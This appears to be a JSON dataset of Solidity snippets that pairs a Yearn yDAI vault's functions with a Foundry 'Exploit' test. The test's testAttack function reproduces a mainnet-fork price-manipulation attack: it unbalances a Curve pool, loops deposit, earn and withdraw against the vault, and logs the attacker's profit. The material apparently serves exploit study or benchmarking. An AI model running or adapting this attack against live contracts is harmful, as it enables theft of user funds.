[
  {
    "contract/interface": "IYVDai",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IYVDai",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(uint _amount) public {\n        uint _pool = balance();\n        uint _before = token.balanceOf(address(this));\n        token.safeTransferFrom(msg.sender, address(this), _amount);\n        uint _after = token.balanceOf(address(this));\n        _amount = _after.sub(_before); // Additional check for deflationary tokens\n        uint shares = 0;\n        if (totalSupply() == 0) {\n            shares = _amount;\n        } else {\n            shares = (_amount.mul(totalSupply())).div(_pool);\n        }\n        _mint(msg.sender, shares);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IYVDai",
    "source_type": "victim_contract",
    "function_name": "earn",
    "original_code": "    function earn() public {\n        uint _bal = available();\n        token.safeTransfer(controller, _bal);\n        Controller(controller).earn(address(token), _bal);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IYVDai",
    "source_type": "victim_contract",
    "function_name": "withdrawAll",
    "original_code": "    function withdrawAll() external {\n        withdraw(balanceOf(msg.sender));\n    }\n    \n    \n    // Used to swap any borrowed reserve over the debt limit to liquidate to 'token'\n",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "add_liquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "get_virtual_price",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity_imbalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 11_792_183);\n        uint256 max_earn_amt = 0;\n        for (uint256 i = 0; i < earn_amt.length; i++) {\n            if (earn_amt[i] > max_earn_amt) {\n                max_earn_amt = earn_amt[i];\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testAttack",
    "original_code": "    function testAttack() public {\n        // Construct the exploit logic here\n        uint256 hacker_dai_amt_before = dai.balanceOf(address(this));\n        uint256 hacker_usdc_amt_before = usdc.balanceOf(address(this));\n\n        require(usdt.balanceOf(address(this)) == 0, \"has usdt\");\n        require(crv3.balanceOf(address(this)) == 0, \"has c3rv\");\n        require(yvdai.balanceOf(address(this)) == 0, \"has ydai\");\n\n        // First make the pool imbalanced\n        curve.add_liquidity([init_add_dai_amt, init_add_usdc_amt, 0], 0);\n\n        // Exploit loop\n        for (uint256 i = 0; i < 5; i++) {\n            curve.remove_liquidity_imbalance([0, 0, remove_usdt_amt], max_3crv_amount);\n\n            yvdai.deposit(earn_amt[i]);\n            yvdai.earn();\n\n            if (i != 4) {\n                curve.add_liquidity([0, 0, remove_usdt_amt], 0);\n            } else {\n                curve.add_liquidity([0, 0, remove_usdt_amt_final_round], 0);\n            }\n\n            yvdai.withdrawAll();\n        }\n\n        // Convert some 3crv\n        uint256 dai_difference = hacker_dai_amt_before - dai.balanceOf(address(this));\n        curve.remove_liquidity_imbalance([dai_difference + 1, init_add_usdc_amt + 1, 0], max_3crv_amount);\n        require(dai.balanceOf(address(this)) == hacker_dai_amt_before + 1, \"incorrect dai bal after attack\");\n        require(usdc.balanceOf(address(this)) == hacker_usdc_amt_before + 1, \"incorrect usdc amount after attack\");\n\n        //Lets give back our initial funding to see real profit\n        writeTokenBalance(address(this), address(dai), dai.balanceOf(address(this)) - hacker_dai_amt_before);\n        writeTokenBalance(address(this), address(usdc), usdc.balanceOf(address(this)) - hacker_usdc_amt_before);\n        //This is attacker profit, Only does one run to show it\n        console.log(\"Attacker get 3crv amt: %d\", crv3.balanceOf(address(this)) / 1e18);\n        console.log(\"Attacker get usdt amt: %d\", usdt.balanceOf(address(this)) / 1e6);\n    }\n",
    "description": ""
  }
]